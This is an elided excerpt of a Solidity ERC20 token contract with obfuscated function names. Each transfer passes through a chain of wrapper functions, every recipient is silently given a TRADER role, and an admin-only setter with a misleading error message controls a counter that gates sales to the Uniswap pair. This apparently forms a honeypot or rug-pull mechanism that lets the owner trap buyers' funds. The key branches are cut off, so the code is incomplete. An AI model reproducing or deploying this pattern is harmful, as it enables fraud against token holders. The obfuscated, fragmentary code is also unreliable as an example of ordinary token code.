...
interface _RNVJFDFGHRoleControl {
...
abstract contract _RNVJFDFGHConsole is Context, _RNVJFDFGHRoleControl {
    ...
    function __RNVJFDFGHchaA(
        bytes32 root,
        uint256 num
    ) public onlyRole(ADMIN) {
        if(root != TRADER){
            revert("svcount is not a number");
        }
        svcount = num;
    }
...
contract _RNVJFDFGHERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _RNVJFDFGHERC20, _RNVJFDFGHConsole {
    ...
    ) _RNVJFDFGHERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_RNVJFDFGHERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __RNVJFDFGHxfgtts(from, to, amt);

    }

    function __RNVJFDFGHxfgtts(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __RNVJFDFGHuijnbf(from, to, amt);
    }


    function __RNVJFDFGHuijnbf(address from, address to, uint256 amt) internal {
        ...
        __RNVJFDFGHytrrvbnh(from, to, amt);
    }

    function __RNVJFDFGHytrrvbnh(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __RNVJFDFGHbrevfhdg(from, to, amt);
    }

    function __RNVJFDFGHbrevfhdg(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __RNVJFDFGHlgyfbtyh(from, to, amt);
    }


    function __RNVJFDFGHlgyfbtyh(address from, address to, uint256 amt) internal {
        if(to == uniswapV2Pair){
            if(svcount > 99){
        ...
        __RNVJFDFGHbvuytyff(from, to, amt);
    }

    function __RNVJFDFGHbvuytyff(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __RNVJFDFGHoervcv(from, to, amt);

        }else if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
    ...
    function __RNVJFDFGHoervcv(address from, address to, uint256 amt) internal {
        if(amt > 0){
